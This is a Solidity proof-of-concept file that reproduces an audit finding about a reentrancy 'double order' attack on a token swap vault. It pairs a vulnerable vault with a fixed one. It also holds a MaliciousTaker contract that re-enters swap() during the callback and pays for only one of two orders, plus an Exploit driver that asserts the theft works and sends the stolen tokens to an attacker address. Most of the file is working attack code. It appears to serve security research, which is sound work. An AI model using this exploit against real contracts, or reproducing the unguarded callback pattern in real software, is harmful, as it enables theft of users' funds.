// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Barter DAO / Superposition finding
// 63500: "Double Order Attack via Callback Mechanism".
//
// SuperpositionVault.swap() transfers the maker's makerToken to the taker FIRST,
// then calls back into the taker (msg.sender) to pull the taker's payment, and
// finally verifies the payment with a balance-DELTA check on the maker's
// takerToken balance (balanceAfter >= balanceBefore + actualTakerAmount). There
// is no reentrancy guard.
//
// A malicious taker re-enters swap() for a SECOND open order from the SAME maker
// during the callback. If both orders share the SAME takerToken, the takerToken
// the taker pays for order #2 lifts the maker's shared-takerToken balance enough
// to satisfy order #1's balance-delta check too — so order #1's makerToken is
// collected WITHOUT paying its takerToken leg. The taker walks away with the
// makerToken from BOTH orders while paying takerToken for only one; the maker is
// robbed of one full order's makerToken.
//
// The verbatim vulnerable core (SuperpositionVault.sol L141-L148) is inlined
// unchanged below with a `// @>` marker on the defective post-callback check.
// Source is `embedded-solidity` (upstream repo BarterLab/superposition-contract
// is deleted); the surrounding swap routing is the minimal faithful double
// described in the finding prose.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20-ish interface used by the Order struct / vault / taker.
interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @dev An open limit order: the maker offers `makerAmount` of `makerToken` in
///      exchange for `takerAmount` of `takerToken`.
struct Order {
    address maker;
    IERC20Like makerToken;
    IERC20Like takerToken;
    uint256 makerAmount;
    uint256 takerAmount;
}

/// @dev The taker callback the vault invokes on msg.sender to pull the payment.
interface ISuperpositionCallback {
    function superpositionCallback(Order calldata order, uint256 actualTakerAmount, bytes calldata callback)
        external;
}

interface IVault {
    function swap(Order calldata order, uint256 filledtakerAmount, bytes calldata callback) external;
}

/// @dev Minimal ERC20 double for the (opaque, out-of-scope) order tokens.
contract MiniToken is IERC20Like {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount; // reverts on insufficient balance (0.8 underflow)
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Faithful minimal double for the maker EOA: holds makerToken and
///      pre-approves the vault, exactly as an EOA would after approving.
contract Maker {
    function approveToken(MiniToken token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. The swap routing is reconstructed from the finding prose;
// the balance-delta payment check (L141-L148) is inlined VERBATIM and unchanged.
// ─────────────────────────────────────────────────────────────────────────────
contract SuperpositionVault is IVault {
    error ReceivedLessThanMinReturn(uint256 balanceAfter, uint256 minReturn);

    function swap(
        Order calldata order,
        uint256 filledtakerAmount,
        bytes calldata callback
    ) external {
        // Reconstructed routing (per prose): "The protocol transfers tokens from
        // maker to taker first" — the vault moves the maker's makerToken to the
        // taker (msg.sender) up front, and then relies on the callback below to
        // pull the taker's takerToken payment back to the maker.
        order.makerToken.transferFrom(order.maker, msg.sender, order.makerAmount);

        // ── VERBATIM vulnerable core: SuperpositionVault.sol L141-L148 ──────────
        uint256 actualTakerAmount =
            filledtakerAmount < order.takerAmount ?
            filledtakerAmount : order.takerAmount;

        uint256 balanceBefore =
            order.takerToken.balanceOf(address(order.maker));

        ISuperpositionCallback(msg.sender).superpositionCallback(
                order, actualTakerAmount, callback);

        uint256 balanceAfter =
            order.takerToken.balanceOf(address(order.maker));

        // Check that callback provided enough tokens
        if (balanceAfter < balanceBefore + actualTakerAmount) { // @> post-callback balance-delta check with NO reentrancy guard: a concurrent same-maker order paying the SHARED takerToken satisfies this order's check too
            revert ReceivedLessThanMinReturn(
                balanceAfter,
                balanceBefore + actualTakerAmount
            );
        }
        // ────────────────────────────────────────────────────────────────────────
    }
}

/// @dev Minimal reentrancy guard for the fixed variant.
abstract contract ReentrancyGuardMin {
    uint256 private _status;

    constructor() {
        _status = 1;
    }

    modifier nonReentrant() {
        require(_status == 1, "REENTRANCY");
        _status = 2;
        _;
        _status = 1;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (the finding's recommendation): settle BOTH legs directly with
// transferFrom at the very end (no cross-order balance-delta check) and add a
// nonReentrant guard. The re-entrant double-fill now reverts.
// ─────────────────────────────────────────────────────────────────────────────
contract SuperpositionVaultFixed is IVault, ReentrancyGuardMin {
    function swap(
        Order calldata order,
        uint256 filledtakerAmount,
        bytes calldata callback
    ) external nonReentrant {
        uint256 actualTakerAmount =
            filledtakerAmount < order.takerAmount ?
            filledtakerAmount : order.takerAmount;

        // Taker is still notified, but tokens are settled directly below — and
        // the guard blocks any re-entrant same-maker order during this call.
        ISuperpositionCallback(msg.sender).superpositionCallback(order, actualTakerAmount, callback);

        // Settle both legs directly: no shared-balance confusion is possible.
        order.makerToken.transferFrom(order.maker, msg.sender, order.makerAmount);
        order.takerToken.transferFrom(msg.sender, order.maker, actualTakerAmount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Malicious taker: re-enters swap() for a second same-maker order (shared
// takerToken) during the first order's callback, paying only the second order's
// takerToken leg. Reused against both the vulnerable and fixed vaults.
// ─────────────────────────────────────────────────────────────────────────────
contract MaliciousTaker is ISuperpositionCallback {
    IVault public vault;
    IERC20Like public takerToken;
    Order internal order1;
    Order internal order2;
    bool internal reentered;

    constructor(address _vault, address _takerToken) {
        vault = IVault(_vault);
        takerToken = IERC20Like(_takerToken);
    }

    function configure(Order calldata o1, Order calldata o2) external {
        order1 = o1;
        order2 = o2;
    }

    function attack() external {
        reentered = false;
        vault.swap(order1, order1.takerAmount, "");
    }

    function superpositionCallback(Order calldata order, uint256 actualTakerAmount, bytes calldata)
        external
    {
        require(msg.sender == address(vault), "only vault");
        if (!reentered) {
            reentered = true;
            // Re-enter for the SECOND same-maker order (SAME takerToken — the crux).
            vault.swap(order2, order2.takerAmount, "");
            // Deliberately pay NOTHING for order #1: order #2's payment (below)
            // already lifted the maker's shared-takerToken balance enough to
            // satisfy order #1's post-callback balance-delta check.
        } else {
            // Inner (order #2) callback: pay ONLY order #2's takerToken leg.
            takerToken.transfer(order.maker, actualTakerAmount);
        }
    }

    function sweep(IERC20Like token, address to, uint256 amount) external {
        token.transfer(to, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: sets up one maker with two open same-maker orders sharing the
// same takerToken, runs the re-entrant double-fill through the REAL vulnerable
// swap(), and delivers the stolen makerToken1 to the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 public constant ORDER_MAKER_AMOUNT = 100 ether;
    uint256 public constant ORDER_TAKER_AMOUNT = 100 ether;

    MiniToken public makerToken1; // "STOLEN-MAKER" — order #1's maker asset
    MiniToken public makerToken2; // order #2's maker asset
    MiniToken public takerToken;  // SHARED across both orders (the crux)
    Maker public maker;
    SuperpositionVault public vault;
    MaliciousTaker public taker;

    // Exposed results for the driver's asserts.
    uint256 public stolenAmount;        // makerToken1 collected for free
    uint256 public makerTakerReceived;  // takerToken the maker received (one order only)
    uint256 public order2Collected;     // makerToken2 collected (legitimately paid)
    uint256 public attackerBalance;     // makerToken1 delivered to ATTACKER

    function makerToken1Addr() external view returns (address) { return address(makerToken1); }
    function takerAddr() external view returns (address) { return address(taker); }
    function makerAddr() external view returns (address) { return address(maker); }
    function vaultAddr() external view returns (address) { return address(vault); }

    constructor() {
        // Fixed deploy order (index 0 = first `new`).
        makerToken1 = new MiniToken("Maker Token One", "STOLEN-MAKER"); // 0
        makerToken2 = new MiniToken("Maker Token Two", "MAKER2");       // 1
        takerToken  = new MiniToken("Taker Token", "TAKER");            // 2
        maker       = new Maker();                                      // 3
        vault       = new SuperpositionVault();                         // 4
        taker       = new MaliciousTaker(address(vault), address(takerToken)); // 5

        // Maker holds both maker tokens and pre-approves the vault (as an EOA would).
        makerToken1.mint(address(maker), ORDER_MAKER_AMOUNT);
        makerToken2.mint(address(maker), ORDER_MAKER_AMOUNT);
        maker.approveToken(makerToken1, address(vault), type(uint256).max);
        maker.approveToken(makerToken2, address(vault), type(uint256).max);

        // Taker is funded to pay for EXACTLY ONE order.
        takerToken.mint(address(taker), ORDER_TAKER_AMOUNT);

        // Two open orders from the SAME maker, sharing the SAME takerToken.
        Order memory o1 = Order({
            maker: address(maker),
            makerToken: IERC20Like(address(makerToken1)),
            takerToken: IERC20Like(address(takerToken)),
            makerAmount: ORDER_MAKER_AMOUNT,
            takerAmount: ORDER_TAKER_AMOUNT
        });
        Order memory o2 = Order({
            maker: address(maker),
            makerToken: IERC20Like(address(makerToken2)),
            takerToken: IERC20Like(address(takerToken)),
            makerAmount: ORDER_MAKER_AMOUNT,
            takerAmount: ORDER_TAKER_AMOUNT
        });
        taker.configure(o1, o2);
    }

    function run() external payable {
        // Execute the REAL re-entrant double-fill against the vulnerable vault.
        taker.attack();

        // Taker now holds makerToken1 (stolen, unpaid) + makerToken2 (paid for),
        // while the maker received takerToken for only ONE of the two orders.
        stolenAmount = makerToken1.balanceOf(address(taker));       // == 100 ether
        order2Collected = makerToken2.balanceOf(address(taker));    // == 100 ether
        makerTakerReceived = takerToken.balanceOf(address(maker));  // == 100 ether (one order)

        // Deliver the stolen makerToken1 to the attacker EOA (the measured asset).
        taker.sweep(IERC20Like(address(makerToken1)), ATTACKER, stolenAmount);
        attackerBalance = makerToken1.balanceOf(ATTACKER);

        // Harm holds: attacker collected a full order's makerToken for free, and
        // the maker was paid takerToken for only one of the two filled orders.
        require(attackerBalance == ORDER_MAKER_AMOUNT, "no theft");
        require(order2Collected == ORDER_MAKER_AMOUNT, "order2 not filled");
        require(makerTakerReceived == ORDER_TAKER_AMOUNT, "maker paid more than once");
    }
}
